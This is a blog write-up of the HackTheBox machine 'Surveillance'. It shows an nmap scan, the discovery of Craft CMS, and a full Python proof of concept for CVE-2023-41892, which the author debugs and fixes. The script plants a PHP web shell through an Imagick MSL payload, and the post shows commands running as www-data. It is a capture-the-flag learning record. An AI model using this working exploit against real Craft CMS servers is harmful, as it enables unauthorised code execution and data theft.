---
layout: post
title: "HackTheBox: Surveillance"
image: /assets/thumbnails/surveillance-thumbnail.png
---

> This is the walkthrough of the machine Surveillance on HackTheBox. Coming very soon!

---

First, we do an Nmap service and version scan. We find that SSH is running on port 22/TCP and also 1 HTTP ports - 80/TCP. 
Also, the target host is UNIX-based.

<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~]
└─$ <span class="highlight-command">nmap -sV -sC 10.10.11.245</span>
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-04 13:33 EST
Nmap scan report for 10.10.11.245
Host is up (0.081s latency).
Not shown: 905 closed tcp ports (conn-refused), 92 filtered tcp ports (no-response)
PORT     STATE SERVICE         VERSION
<span class="highlight-output">22/tcp   open  ssh             OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)</span>
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.57 seconds
	</code>
</pre>

<figure>
  <figcaption class="figcaption-style">Enumerating the open ports and listening services using Nmap.</figcaption>
</figure>

Port 80/TCP contains a redirect to http://surveillance.htb/. In order access the domain, we have to first add it to the /etc/hosts 
file. We can use the vim editor to edit the file. Then add the IP address and the surveillance.htb domain. To save and exit,
click the Esc button and then type ":wq".

<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~]
└─$ <span class="highlight-command">sudo vim /etc/hosts</span>                
[sudo] password for kali: 


127.0.0.1	localhost
127.0.1.1	kali

::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters


<span class="highlight-output">10.10.11.245     surveillance.htb</span>
	</code>
</pre>

<figure>
  <figcaption class="figcaption-style">Adding the domain surveillance.htb to the /etc/hosts file.</figcaption>
</figure>

After opening http://surveillance.htb in a browser, we can scroll all the way down to the bottom of the page and we can see that 
the website is created using Craft CMS. CMS stands for Content Management System. Other popular CMSs are WordPress, Joomla and Drupal.

![craft cms](/assets/img/projects-img/surveillance-craft-cms.png)

<figure>
  <figcaption class="figcaption-style">Discovering target is running Craft CMS.</figcaption>
</figure>

Since searching with Searchsploit revealed only old exploits, I googled "Craft CMS exploit" and got a very recent 
[Common Vulnerabilities and Exposures (CVE) entry](https://www.cvedetails.com/cve/CVE-2023-41892/) with ID CVE-2023-41892. This is 
a Remote Code Execution (RCE) vulnerability that affects Craft CMS versions prior to 4.4.15. While I was unable to determine the 
exact version of Craft CMS that the target is running, I also could not find any other possible attack vectors. There is a login 
portal at the `/admin/login` endpoint which I couldn't brute force with common credentials like admin:administrator etc., and 
also a `/web.config` endpoint that contains redirection rules but nothing unusual. 

So, I decided to proceed with the exploit. There is a publicly available Proof-of-Concept (PoC) on 
[GitHub](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce) written in Python. I copied the script to my local machine,
saved it as CVE-2023-41892-POC.py and ran it. The script seemed to execute and even provide a reverse shell but running commands through 
it resulted in no output.


<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~/CTF/SurveillanceHTB]
└─$ <span class="highlight-command">python3 craft_poc.py http://surveillance.htb/</span>
[-] Get temporary folder and document root ...
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ <span class="highlight-command">id</span>
$ <span class="highlight-command">id</span>
$ <span class="highlight-command">pwd</span>
	</code>
</pre>

<figure>
  <figcaption class="figcaption-style">Executing the PoC but no command output.</figcaption>
</figure>

I decided to examine the Python script to check for irregularities. Simply said, the script exploits a command injection vulnerability 
by imbedding PHP code inside an image. It then triggers the PHP library Imagick to execute commands on the server by writing PHP shell 
code to the image. 

I made a few changes to the code. Firstly, I removed the proxy parameters from the requests sent to the server. It seems like those were
added by the author for debugging purposes. Secondly, I wanted to test what values the variables upload_tmp_dir and documentRoot had 
in the main function before writing the payload to the document root. For this reason, I simply added statements to print them and 
observe. You can see the changes highlighted below.

<pre class="grey-code">
	<code>
import requests
import re
import sys

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36"
}

def writePayloadToTempFile(documentRoot):

    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/etc/passwd"}}}'
    }

    files = {
        "image1": ("pwn1.msl", "&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
        "image1": ("pwn1.msl", "&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&NewLine;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;image&gt;&NewLine;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;read filename=&quot;caption:&amp;lt;?php @system(@$_REQUEST['cmd']); ?&amp;gt;&quot;/&gt;&NewLine;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;write filename=&quot;info:DOCUMENTROOT/shell.php&quot;&gt;&NewLine;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/image&gt;".replace("DOCUMENTROOT", documentRoot), "text/plain")
    }

    response = requests.post(url, headers=headers, data=data, files=files<span class="highlight-output">, proxies={"http": "http://localhost:8080"}</span>)


def getTmpUploadDirAndDocumentRoot():
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": r'{"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'
    }

    response = requests.post(url, headers=headers, data=data)

    pattern1 = r'&lt;tr&gt;&lt;td class="e"&gt;upload_tmp_dir&lt;\/td&gt;&lt;td class="v"&gt;(.*?)&lt;\/td&gt;&lt;td class="v"&gt;(.*?)&lt;\/td&gt;&lt;\/tr&gt;'
    pattern2 = r'&lt;tr&gt;&lt;td class="e"&gt;\$_SERVER\[\'DOCUMENT_ROOT\'\]&lt;\/td&gt;&lt;td class="v"&gt;([^&lt;]+)&lt;\/td&gt;&lt;\/tr&gt;'

    match1 = re.search(pattern1, response.text, re.DOTALL)
    match2 = re.search(pattern2, response.text, re.DOTALL)
    return match1.group(1), match2.group(1)

def trigerImagick(tmpDir):
    
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + tmpDir + r'/php*"}}}'
    }
    response = requests.post(url, headers=headers, data=data<span class="highlight-output">, proxies={"http": "http://localhost:8080"}</span>)    

def shell(cmd):
    response = requests.get(url + "/shell.php", params={"cmd": cmd})
    match = re.search(r'caption:(.*?)CAPTION', response.text, re.DOTALL)

    if match:
        extracted_text = match.group(1).strip()
        print(extracted_text)
    else:
        return None
    return extracted_text

if __name__ == "__main__":
    if(len(sys.argv) != 2):
        print("Usage: python CVE-2023-41892.py &lt;url&gt;")
        exit()
    else:

        url = sys.argv[1]
        print("[-] Get temporary folder and document root ...")
        upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()
        <span class="highlight-output">print("TEST - printing tmp upload directory and document root")</span>
        <span class="highlight-output">print(upload_tmp_dir)</span>
        <span class="highlight-output">print(documentRoot)</span>
        tmpDir = "/tmp" if upload_tmp_dir == "no value" else upload_tmp_dir
        print("[-] Write payload to temporary file ...")
        try:
            writePayloadToTempFile(documentRoot)
        except requests.exceptions.ConnectionError as e:
            print("[-] Crash the php process and write temp file successfully")

        print("[-] Trigger imagick to write shell ...")
        try:
            trigerImagick(tmpDir)
        except:
            pass

        print("[-] Done, enjoy the shell")
        while True:
            cmd = input("$ ")
            shell(cmd)
    </code>
</pre>

<figure>
  <figcaption class="figcaption-style">Deleting the proxy routing parameters and adding print statements for debugging purposes to the PoC.</figcaption>
</figure>

After saving my changes, I ran the script again. It seems like the script was able to correctly pull the root directory from the 
server (`documentRoot`). The value of `upload_tmp_dir` seems to be the string "<i>no value</i>". However, executing commands still 
did not work.

<pre class="grey-code">
	<code>
──(kali㉿kali)-[~/CTF/SurveillanceHTB]
└─$ <span class="highlight-command">python3 CVE-2023-41892-POC.py http://surveillance.htb/</span>          
[-] Get temporary folder and document root ...
TEST - printing tmp upload directory and document root
<span class="highlight-output">&lt;i&gt;no value&lt;/i&gt;</span>
<span class="highlight-output">/var/www/html/craft/web</span>
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ <span class="highlight-command">id</span>
$
	</code>
</pre>

<figure>
  <figcaption class="figcaption-style">Testing for the value of upload_tmp_dir and documentRoot.</figcaption>
</figure>

In the main function of the original PoC script, we can see that a check is performed if the value of `upload_tmp_dir` is equal
to the string "no value". If so, the variable `tmpDir` is assigned the value "/tmp" and is used to trigger Imagick afterwards. 
However, from the output of my latest run of the script I found that the value of `upload_tmp_dir` is actually "<i>no value</i>" 
which is not the same as "no value". This means that the check most likely fails and the variable `tmpDir` gets assigned the value of 
`upload_tmp_dir` instead of "/tmp". So, I changed the statement to instead check if the value of `upload_tmp_dir` is "<i>no value</i>". 
I also added a print satement afterwards to confirm that `tmpDir` equals "/tmp".


<pre class="grey-code">
	<code>
&lt;SNIP&gt;

if __name__ == "__main__":
    if(len(sys.argv) != 2):
        print("Usage: python CVE-2023-41892.py &lt;url&gt;")
        exit()
    else:
        url = sys.argv[1]
        print("[-] Get temporary folder and document root ...")
        upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()
        print("TEST - printing tmp upload directory and document root")
        print(upload_tmp_dir)
        print(documentRoot)

        <span class="highlight-output">tmpDir = "/tmp" if upload_tmp_dir == "<i>no value</i>" else upload_tmp_dir</span>
        <span class="highlight-output">print("Value of tmpDir is:")</span>
        <span class="highlight-output">print(tmpDir)</span>

        print("[-] Write payload to temporary file ...")
        try:
            writePayloadToTempFile(documentRoot)
        except requests.exceptions.ConnectionError as e:
            print("[-] Crash the php process and write temp file successfully")

        print("[-] Trigger imagick to write shell ...")
        try:
            trigerImagick(tmpDir)
        except:
            pass

        print("[-] Done, enjoy the shell")
        while True:
            cmd = input("$ ")
            shell(cmd)
	</code>
</pre>

<figure>
  <figcaption class="figcaption-style">Fixing the if-statement to correctly check for the value of uplad_tmp_dir.</figcaption>
</figure>


I then ran the script again. In the output we can see that the value of `upload_tmp_dir` is now "<i>no value</i>" and that the 
value of `tmpDir` is now correctly assigned as "/tmp". Another clear sign that the script works is the fact that I was now able 
to execute commands successfully. From the output of my commands, there are two main takeaways - the Craft CMS app is running in 
the context of user www-data and there is a very interesting Sever Query Language (SQL) compressed backup file called 
"surveillance--2023-10-17-202801--v4.4.14.sql.zip".


<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~/CTF/SurveillanceHTB]
└─$ <span class="highlight-command">python3 CVE-2023-41892-POC.py http://surveillance.htb/</span>
[-] Get temporary folder and document root ...
TEST - printing tmp upload directory and document root
&lt;i&gt;no value&lt;/i&gt;
/var/www/html/craft/web
<span class="highlight-output">Value of tmpDir is:</span>
<span class="highlight-output">/tmp</span>
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ <span class="highlight-command">ls</span>
cpresources
css
fonts
images
img
index.php
js
shell.php
<span class="highlight-output">surveillance--2023-10-17-202801--v4.4.14.sql.zip</span>
web.config
$ <span class="highlight-command">whoami</span>
<span class="highlight-output">www-data</span>
	</code>
</pre>

<figure>
  <figcaption class="figcaption-style">Executing the PoC and receiving a working reverse shell.</figcaption>
</figure>